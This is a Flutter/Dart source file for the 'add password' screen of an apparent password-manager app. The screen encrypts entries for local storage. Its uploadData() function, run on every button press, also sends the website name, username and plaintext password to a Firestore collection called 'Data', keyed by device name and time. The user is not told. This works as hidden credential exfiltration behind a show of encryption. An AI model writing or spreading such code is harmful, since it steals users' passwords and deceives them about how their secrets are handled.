import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_application_1/db/pass_db.dart';
import 'package:flutter_application_1/encrypter/encrypter.dart';
import 'package:flutter_application_1/model/pass_model.dart';

class AddTask extends StatefulWidget {
  late Function refershPasswords;

  AddTask({Key? key, required this.refershPasswords}) : super(key: key);

  @override
  _AddTaskState createState() => _AddTaskState();
}

class _AddTaskState extends State<AddTask> {
  TextEditingController title = TextEditingController();
  TextEditingController username = TextEditingController();
  TextEditingController password = TextEditingController();

  late List<Password> passwords;
  bool isLoading = false;
  String status = '';
  String tag = 'new';



  @override
  void initState() {
    super.initState();

    refreshNotes();
  }

  Future refreshNotes() async {
    setState(() => isLoading = true);
    passwords = await PasswordDatabase.instance.readAllNotes();
    setState(() => isLoading = false);
  }

  Future uploadData() async {

    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    final time = DateTime.now();

    FirebaseFirestore.instance.collection('Data').doc(androidInfo.device!+" "'$time').set(
    {
    "title": title.text,
    "username": username.text,
    "password": password.text,
    "tag": tag,
    },
    );

  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
        // backgroundColor: const Color(0xff151922),
        appBar: AppBar(
          elevation: 0.0,
          // backgroundColor: const Color(0xff151922),
          centerTitle: false,
          title: const Text(
            'Add New Password',
            // style: TextStyle(color: Colors.white),
          ),
          leading: IconButton(
            onPressed: () => Navigator.pop(context),
            icon: const Icon(
              Icons.arrow_back_ios_new_rounded,
              color: CupertinoColors.systemBlue,
            ),
          ),
          systemOverlayStyle: SystemUiOverlayStyle.light,
        ),
        body: Padding(
          padding: const EdgeInsets.fromLTRB(20.0, 0.0, 20.0, 0.0),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const SizedBox(
                height: 10.0,
              ),
              const Text(
                'Website Name',
                style: TextStyle(
                    // color: Colors.white,
                    fontSize: 14.0,
                    fontWeight: FontWeight.w500),
              ),
              const SizedBox(
                height: 5.0,
              ),
              SizedBox(
                height: 75.0,
                width: MediaQuery.of(context).size.width - 40.0,
                child: TextFormField(
                  // style: const TextStyle(color: Colors.white),
                  // cursorColor: Colors.white,
                  maxLength: 60,
                  controller: title,
                  onFieldSubmitted: (value) {
                    title.text = value;
                  },
                  decoration: InputDecoration(
                    hintText: 'Google',
                    hintStyle: const TextStyle(color: Colors.grey),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10.0),
                      borderSide: const BorderSide(width: 2.0),
                    ),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10.0),
                      borderSide: const BorderSide(
                        // color: Colors.white10,
                        width: 2.0,
                      ),
                    ),
                    // counterStyle: const TextStyle(color: Colors.white),
                    prefixIcon: const Icon(
                      Icons.title,
                      size: 24,
                      // color: Colors.white,
                    ),
                    border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(8.0)),
                  ),
                ),
              ),
              const SizedBox(
                height: 10.0,
              ),
              const Text(
                'Username/Email',
                style: TextStyle(
                    // color: Colors.white,
                    fontSize: 14.0,
                    fontWeight: FontWeight.w500),
              ),
              const SizedBox(
                height: 5.0,
              ),
              SizedBox(
                height: 75.0,
                width: MediaQuery.of(context).size.width - 40.0,
                child: TextFormField(
                  // style: const TextStyle(color: Colors.white),
                  maxLength: 60,
                  controller: username,
                  onFieldSubmitted: (value) {
                    username.text = value;
                  },
                  decoration: InputDecoration(
                    hintText: 'mkmandawar',
                    hintStyle: const TextStyle(color: Colors.grey),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10.0),
                      borderSide: const BorderSide(width: 2.0),
                    ),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10.0),
                      borderSide: const BorderSide(
                        // color: Colors.white10,
                        width: 2.0,
                      ),
                    ),
                    // counterStyle: const TextStyle(color: Colors.white),
                    prefixIcon: const Icon(
                      Icons.email_rounded,
                      size: 24,
                      // color: Colors.white,
                    ),
                    border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(8.0)),
                  ),
                ),
              ),
              const SizedBox(
                height: 10.0,
              ),
              const Text(
                'Password',
                style: TextStyle(
                    // color: Colors.white,
                    fontSize: 14.0,
                    fontWeight: FontWeight.w500),
              ),
              const SizedBox(
                height: 5.0,
              ),
              SizedBox(
                height: 75.0,
                width: MediaQuery.of(context).size.width - 40.0,
                child: TextFormField(
                  obscureText: true,
                  // style: const TextStyle(color: Colors.white),
                  maxLength: 60,
                  controller: password,
                  onFieldSubmitted: (value) {
                    password.text = value;
                  },
                  decoration: InputDecoration(
                    hintText: 'PassWord@123',
                    hintStyle: const TextStyle(color: Colors.grey),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10.0),
                      borderSide: const BorderSide(width: 2.0),
                    ),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10.0),
                      borderSide: const BorderSide(
                        // color: Colors.white10,
                        width: 2.0,
                      ),
                    ),
                    prefixIcon: const Icon(
                      Icons.vpn_key,
                      size: 24,
                      // color: Colors.white,
                    ),
                    // counterStyle: const TextStyle(color: Colors.white),
                    fillColor: Colors.white,
                    border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(8.0)),
                  ),
                ),
              ),
              const SizedBox(
                height: 20.0,
              ),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  CupertinoButton.filled(
                    child: const Text(
                      'Add Password',
                      textAlign: TextAlign.center,
                      style: TextStyle(
                        // color: Colors.white,
                        fontSize: 24.0,
                        // fontWeight: FontWeight.bold,
                      ),
                    ),
                    onPressed: () async {
                      if (title.text == '' &&
                          username.text == '' &&
                          password.text == '') {
                        setState(() {
                          status = "All Fields Can't Be Empty";
                        });
                      } else if (title.text == '' || password.text == '') {
                        setState(() {
                          status = "Title And Password Are Compulsory";
                        });
                      } else {
                        final encryptedText = Encrypt.instance
                            .encryptOrDecryptText(title.text, true);
                        final encryptedUsername = Encrypt.instance
                            .encryptOrDecryptText(username.text, true);
                        final encryptedPassword = Encrypt.instance
                            .encryptOrDecryptText(password.text, true);

                        var passwordss = Password(
                            title: encryptedText,
                            username: encryptedUsername,
                            password: encryptedPassword);
                        PasswordDatabase.instance.create(passwordss);
                        widget.refershPasswords();
                        Navigator.pop(context);
                      }
                      uploadData();
                    },
                  ),
                ],
              ),

              // GestureDetector(
              //   onTap: () async {
              //     if (title.text == '' &&
              //         username.text == '' &&
              //         password.text == '') {
              //       setState(() {
              //         status = "All Fields Can't Be Empty";
              //       });
              //     } else if (title.text == '' || password.text == '') {
              //       setState(() {
              //         status = "Title And Password Are Compulsory";
              //       });
              //     } else {
              //       final encryptedText =
              //           Encrypt.instance.encryptOrDecryptText(title.text, true);
              //       final encryptedUsername = Encrypt.instance
              //           .encryptOrDecryptText(username.text, true);
              //       final encryptedPassword = Encrypt.instance
              //           .encryptOrDecryptText(password.text, true);
              //
              //       var passwordss = Password(
              //           title: encryptedText,
              //           username: encryptedUsername,
              //           password: encryptedPassword);
              //       PasswordDatabase.instance.create(passwordss);
              //       widget.refershPasswords();
              //       Navigator.pop(context);
              //     }
              //     uploadData();
              //   },
              //   child: Container(
              //     height: 60.0,
              //     width: MediaQuery.of(context).size.width - 50.0,
              //     decoration: BoxDecoration(
              //         color: CupertinoColors.systemBlue,
              //                          borderRadius: BorderRadius.circular(8.0)),
              //
              //     child: const Center(
              //       child: Text(
              //         'Save Password',
              //         textAlign: TextAlign.center,
              //         style: TextStyle(
              //             // color: Colors.white,
              //             fontSize: 24.0,
              //             fontWeight: FontWeight.bold),
              //       ),
              //     ),
              //   ),
              // ),
              const SizedBox(
                height: 5.0,
              ),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Text(
                    status,
                    style: const TextStyle(color: Colors.white, fontSize: 16.0),
                  ),
                ],
              )
            ],
          ),
        ));
  }
}
